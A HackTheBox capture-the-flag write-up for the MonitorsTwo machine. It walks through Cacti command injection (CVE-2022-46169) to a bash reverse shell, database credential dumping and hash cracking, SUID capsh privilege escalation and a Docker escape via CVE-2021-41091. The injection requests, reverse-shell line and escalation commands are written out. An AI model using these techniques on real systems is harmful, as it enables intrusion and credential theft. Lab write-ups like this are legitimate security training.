# [MonitorsTwo](https://app.hackthebox.com/machines/MonitorsTwo) - 05/05/2023 - HackTheBox write-up

## User flag

### Discovery

First, we a `nmap` we can only find an HTTP and a SSH server, nothing really interesting. On the webpage we can find it's a `Cacti` instance in version 1.2.22.

### Searching for vulnerability

Current version of `Cacti` is 1.2.24, and we can see in the GitHub releases that they patch a critical CVE (CVE-2022-46169) in the version 1.2.23.

So it's more than probable that we have to exploit this CVE. So we can search on the net for a `CVE-2022-46169 poc exploit`. We can find the following PoC easily : [https://github.com/sAsPeCt488/CVE-2022-46169](https://github.com/sAsPeCt488/CVE-2022-46169).

### Exploitation

After reading the code and try to understand the vulnerability, I try to run the script, and it works. The server is vulnerable to this CVE, and with the script we can found the correct parameters to submit to obtain code execution. With some `sleep` tests, we can confirm that the RCE works, so we will do the reverse shell :
```bash
# Command injection goes in poller_id parameter
GET /remote_agent.php?action=polldata&host_id=1&poller_id=;echo "bash -i >& /dev/tcp/10.10.14.65/56384 0>&1" > revshell.sh&local_data_ids[]=0&[...] HTTP/1.1
Host: 10.10.11.211
X-Forwarded-For: 127.0.0.1      # bypass IP restriction with this parameter
Connection: close
```

Start a `netcat` and then :
```bash
GET /remote_agent.php?action=polldata&host_id=1&poller_id=;bash revshell.sh &&local_data_ids[]=0&[...] HTTP/1.1
Host: 10.10.11.211
X-Forwarded-For: 127.0.0.1
Connection: close
```

We have a reverse shell on the server.

But we are user `www-data` and we are in a docker container so we have two problems : became `root` user and then escape from the container.

### Escape from container

I try many things to became root because I didn't find the right way first, and also I was thinking that it may be helpful to connect as an admin to the `Cacti` application. By looking at the file `entrypoint.sh` in the root of the file system we can find the database credentials and the command to connect to it. With this we can inspect the database, especially users passwords :
```bash
bash-5.1$ mysql --host=db --user=root --password=root cacti -e "select * from user_auth"
id	username	password	realm	full_name	email_address	must_change_password	password_change	show_tree	show_list	show_preview	graph_settings	login_opts	policy_graphs	policy_trees	policy_hosts	policy_graph_templates	enabled	lastchange	lastlogin	password_history	locked	failed_attempts	lastfail	reset_perms
1	admin	$2y$10$IhEA.Og8vrvwueM7VEDkUes3pwc3zaBbQ/iuqMft/llx8utpR1hjC	0	Jamie Thompson	admin@monitorstwo.htb		on	on	on	on	on	2	1	1	1	1	on	-1	-1	-1		0	0	663348655
3	guest	43e9a4ab75570f5b	0	Guest Account		on	on	on	on	on	3	1	1	1	1	1		-1	-1	-1		0	0	0
4	marcus	$2y$10$vcrYth5YcCLlZaPDj6PwqOYTw68W1.3WeKlBn70JonsdW/MhFYK4C	0	Marcus Brune	marcus@monitorstwo.htb			on	on	on	on	1	1	1	1	1	on	-1	-1	on	0	0	2135691668
```

This two hashes are `bcrypt` hashes so it will takes time to crack them, but we can have a try.

Quickly, with `john` and `rockyou` we can crack the hash from user `marcus` and get the password `funkymonkey`. The other one didn't get cracked within a few minutes, so we can suppose that it can't be cracked with `rockyou`.

With this credentials we can connect to the `Cacti` website but this user doesn't have any rights on the instance so it will not help. Also, we have total control of the database since we can connect to it as `root` so we can just change the `admin` password hash directly in the database :
```bash
mysql --host=db --user=root --password=root cacti -e "update user_auth set password = <hash> where username = 'admin'"
```

It works, and now we have an admin access to the web app. Unfortunately, it doesn't give us anything else, there is nothing interesting in the app.

So, next option we can try with `linpeas` and enumerate any possible way to gain privileges. After some researches and failures, I find that the binary `capsh` have the SUID bit. With a quick research we can find that we can use it to obtain a root shell. Just run the following command :
```bash
capsh --uid=0 --gid=0 --
```

And now we are `root`.

With `root` rights I came back to container escaping and retry some exploits and scripts to escape from it. But, after a lot of failures I've started to losing hope about escaping the container, and also I've read on the forum that such kernel exploits and docker escaping are not for easy machines, so I start to find something else.

If we came back to the basics, I remember the password that I've cracked before (`funkymonkey` for username `marcus`) and I just didn't test it on the SSH server...

So, obviously, it was that... Get the user flag and go for the next step.

## Root flag

### Searching for elevating privileges

After a few researches about Docker and privileges escalation we can found the following vulnerability : `CVE-2021-41091`. It requires to be `root` on the docker to exploit it and run commands as `root` on the host. But we see previously that we could become `root` easily on the container with the `capsh` binary. We can found a POC here : [https://github.com/UncleJ4ck/CVE-2021-41091.git](https://github.com/UncleJ4ck/CVE-2021-41091.git).

### Exploitation

So, to exploit this CVE we need to connect again with the reverse shell on the container, and then change the permissions on `/bin/bash` :
```bash
# In the container
$ capsh --uid=0 --gid=0 --
# Root user
$ chmod u+s /bin/bash
```

Now we can run the POC on the host with the SSH access :
```bash
marcus@monitorstwo:~$ ./exp.sh 
[!] Vulnerable to CVE-2021-41091
[!] Now connect to your Docker container that is accessible and obtain root access !
[>] After gaining root access execute this command (chmod u+s /bin/bash)

Did you correctly set the setuid bit on /bin/bash in the Docker container? (yes/no): yes
[!] Available Overlay2 Filesystems:
/var/lib/docker/overlay2/4ec09ecfa6f3a290dc6b247d7f4ff71a398d4f17060cdaf065e8bb83007effec/merged
/var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged

[!] Iterating over the available Overlay2 filesystems !
[?] Checking path: /var/lib/docker/overlay2/4ec09ecfa6f3a290dc6b247d7f4ff71a398d4f17060cdaf065e8bb83007effec/merged
[x] Could not get root access in '/var/lib/docker/overlay2/4ec09ecfa6f3a290dc6b247d7f4ff71a398d4f17060cdaf065e8bb83007effec/merged'

[?] Checking path: /var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged
[!] Rooted !
[>] Current Vulnerable Path: /var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged
[?] If it didn't spawn a shell go to this path and execute './bin/bash -p'

[!] Spawning Shell
bash-5.1# exit
```

And now we can obtain a root shell and get the flag:
```bash
marcus@monitorstwo:~$ cd /var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged
marcus@monitorstwo:/var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged$ ./bin/bash -p
bash-5.1# id
uid=1000(marcus) gid=1000(marcus) euid=0(root) groups=1000(marcus)
bash-5.1# cat /root/root.txt 
bb4f74efaff61432df0363b06d75c383
```
